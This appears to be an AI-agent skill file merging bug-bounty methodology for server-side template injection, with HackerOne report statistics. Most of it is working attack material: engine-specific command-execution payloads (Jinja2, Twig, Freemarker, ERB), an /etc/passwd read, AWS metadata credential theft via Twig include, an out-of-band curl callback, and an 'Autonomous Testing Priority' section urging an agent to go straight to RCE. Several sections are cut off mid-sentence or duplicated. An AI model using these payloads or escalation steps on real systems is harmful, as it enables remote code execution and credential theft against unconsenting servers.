---
name: bbhunt-ssti
description: "Use for user input evaluated by Jinja2, Twig, Freemarker, ERB, Velocity, Thymeleaf, Smarty, EJS, Pug or similar template engines. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Server-Side Template Injection — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Detect with a harmless arithmetic expression in the exact context (name, email, subject, template preview).
2. Identify the engine using a decision tree and error messages, not a blind RCE payload.
3. Confirm expression evaluation with a unique marker before escalating.
4. Find a sandbox escape appropriate to the identified engine and version; prefer a non-destructive proof.
5. Test second-order SSTI: a value stored in a profile and rendered later in an email or PDF.
6. Prove code execution or file read with an unambiguous callback/output and document the engine.

### Signals

- Input rendered into a template rather than printed directly
- Math-expression evaluation in a response
- Email/subject/PDF/document generation using templates

### Kill criteria

- Input is escaped or treated as a literal value.
- No expression evaluation — only reflected text.
- Engine sandbox prevents escalation and no consequence is demonstrated.

### Escalation chains

- SSTI -> RCE -> internal access.
- Stored SSTI -> admin-side rendering -> higher privilege.

### Veteran tip

The operator's notes: identify engine first with a decision tree, then exploit — never skip detection.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- Identify the engine from output and error messages.
- Escalate to file read/RCE with engine-specific payloads.
- Check email templates, PDF/report generators, and theme editors.

### Deeper checklist

- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- Identify the engine from evaluated output and error messages.
- Escalate to file read/RCE with engine-specific payloads.
- Check sandbox escapes and filter bypasses.
- Look at email templates, PDF/report generators, and theme editors.
- Prove execution with a harmless callback or command output.

### Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

### A. Discovery checklist — concrete places, params, headers, file types to look

- Treat any field whose value is re-rendered through a template as a candidate: `name`, `message`, `subject`, `email`, `preview`, `theme`, `description`, `bio`, invoice/product name, PDF/report title, and CMS "edit template" bodies.
- Highest-yield sinks are stored-and-rendered surfaces, not just the immediate HTTP response: outbound email templates (profile name rendered into a confirmation mail), invoice/PDF generators, "documentation"/template-editor preview forms, and admin CMS template editors.
- Probe the full syntax matrix at each candidate — a single-engine probe silently misses polyglot-capable sinks. Send `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `*{7*7}`, `@(7*7)` (Razor), `{php}echo 7*7;{/php}` (Smarty).
- Code-context probing: when input lands *inside* an expression, break out — e.g. `greeting=data.username}}<tag>` — and look for the literal tag rendered alongside the value.
- Fingerprint with the all-syntax fuzz string ` ${{<%[%'"}}%\ `; the resulting error text commonly names Handlebars, Jinja2, Twig, or Freemarker (PortSwigger "unknown language" lab pattern).
- The "SSTI using documentation" class lives behind authenticated template editors — enumerate CMS/admin routes, not only public forms. A record id is usually a query param (`?productId=N`) while the body carries `csrf`, `template`, and `template-action=preview|save`.
- Enumerate in-scope engine/environment objects: `${T(java.lang.System).getenv()}` (Java), `{{config}}` (Flask/Jinja2 — leaks `SECRET_KEY`), `_self` (Twi

### Signals and surfaces

### Signal

- Reports: **28** · paid: **6**
- Median bounty **$2,150** · p90 **$10,000** · max **$10,000** · total **$18,550**
- Median upvotes **26**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Uber | 2 | $13,000 | 172 |
| GitHub Security Lab | 4 | $2,300 | 54 |
| Mail.ru | 2 | $2,000 | 166 |
| Shopify | 2 | $1,000 | 440 |
| Nextcloud | 1 | $250 | 17 |
| GitHub | 2 | $0 | 141 |
| WordPress | 2 | $0 | 41 |
| Unikrn | 1 | $0 | 122 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`template` `name` `message` `email` `subject` `preview` `report` `theme`

### Techniques, payloads and bypasses

### Payloads & probes

- Jinja2 -> `{{config}}` `{{cycler.__init__.__globals__.os.popen('id').read()}}`
- Twig -> `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`
- Freemarker -> `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- ERB -> `<%= system('id') %>`

### Payload bank

**37 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Bypass tricks

- Bypass filters with string concatenation, `attr`, `|join`, and hex escapes.
- Use sandbox escapes for the specific engine/version.
- Blind SSTI via time delays or OOB.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **H1514 Server Side Template Injection in Return Magic email templates?** — `#423541` · Shopify · $0 · ▲409
  > `{{ this. proto .constructor.name }}` -- `Object`
- **uber.com may RCE by Flask Jinja2 Template Injection** — `#125980` · Uber · $10,000 · ▲137
  > First, if you change your profile name to {{ '7' 7 }}, and you will receive a mail
- **Urgent: Server side template injection via Smarty template allows for RCE** — `#164224` · Unikrn · $0 · ▲122
  > To start, I began with the payload {7 7} and received a template error in the email I received {F115749} Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to test {php} tags by…
- **Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward** — `#2332623` · GitHub · $0 · ▲80
  > A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding.
- **Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection** — `#2332551` · GitHub · $0 · ▲61
  > A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Mana

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 2× | `{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}` |
| 2× | `{{7*7}}` |
| 2× | `{{...}}` |
| 1× | `{{ this }}` |
| 1× | `{{ this.__proto__ }}` |
| 1× | `{{ this.__proto__.constructor.name }}` |
| 1× | `https://<shop>.myshopify.com/admin/apps/returnmagic` |
| 1× | `{{this}}` |
| 1× | `{php}print "Hello"{/php}` |
| 1× | `{F115751}. Finally I used file_get_contents to begin extracting the etc/pass file` |
| 1× | `-alert(document.domain)-` |
| 1× | `with($context) { / with($registry) { / return {typedInput: ''-alert(document.domain)-''} / } / }` |
| 1× | `window.parent.postMessage(JSON.stringify({ / message: "Shopify.API.Modal.input", / data: { / message: { / message: "", / value: "'-alert(doc` |
| 1× | `/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48e` |
| 1× | `/admin/apps/$id` |
| 1× | `shopify-whitehat-1@bored.engineer` |
| 1× | `$your-shop$.myshopify.com` |
| 1× | `https://mercantile.wordpress.org/search/{{constructor.constructor('alert(document.domain)')()}}` |
| 1× | `{{2*2}}` |
| 1× | `curl -os{popen('sleep 10').read()} --url gyvgzienwleealjmudejwl83p3p29bxi9.oast.fun` |

### Detection Payloads (try all)

```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

_...and 2 more sections in `references/unified-method.md`._

### Validation and proof

### Blind / OOB

```text
{{7*'7'}}
{{lipsum.__globals__['os'].popen('sleep 5').read()}}
${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
<%= sleep(5) %>
{{range(1000000000)}}
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` (37)

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### C. Validation / proof bar — how to confirm and avoid false positives

- Arithmetic reflection (`{{7*7}} → 49`) is detection, not impact. Claim Critical only after command output (`uid=...`) or a unique Collaborator/interactsh callback fired from inside the evaluated payload.
- A payload echoed literally (HTML-escaped, or inside an attribute) is a false positive. Confirm evaluation in the real sink — the email body, exported PDF, or preview pane — not merely the immediate response.
- Differentiate engines with at least two probes: `{{7*'7'}}` returns `7777777` on Jinja2 but `49` on Twig; `${7*7}`+`#{7*7}` together indicate Freemarker.
- Sandboxed/expression-only evaluation with no runtime access is Medium SSTI, not Critical RCE. Prove file read or command execution before raising severity.
- Respect content type: JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing) — replay as `application/x-www-form-urlencoded`.
- Re-fetch CSRF for each iteration; use `template-action=preview` to iterate without persisting, then `save` and trigger the public render only once the payload is correct.
- Reproduce verbatim twice and retain the raw request/response showing the exact field, content type, and evaluated output.

**Engine-discriminator matrix (record which probes actually evaluate):**
- `{{7*7}} → 49` — Jinja2, Twig, Smarty (`{php}` variant), Nunjucks.
- `{{7*'7'}} → 7777777` — Jinja2 string repetition; `49` — Twig numeric coercion.
- `${7*7} → 49` and `#{7*7} → 49` — Freemarker (Java); `{{7*7}}` does nothing here.
- `<%= 7*7 %> → 

### Escalation and related chains

### Escalation chains

- SSTI -> RCE.
- SSTI -> file read -> creds.

### Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward

`#2332623` · GitHub · $0 · high · 2024-09-13 · ▲80
> A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role.

### Related Skills & Chains

- **`rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `

### Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCa

### Tools and wordlists

### Tools

`tplmap` · `SSTImap` · `Burp` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_ssti.txt` | 21 |
| `~/.local/share/hackerone-reports/wordlists/params_ssti.txt` | 12 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` | 37 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_ssti.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssti.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssti.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Test name/email/subject/template/preview fields; confirm engine before RCE.

```sh
nuclei -u https://target -tags ssti \
       -severity low,medium,high,critical -rl 40 -o nuclei_ssti.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssti -dast \
       -rl 40 -o nuclei_ssti_ssti.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-ssti`
- `hunting` — `ssti`
- `cbh` — `hunt-ssti`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
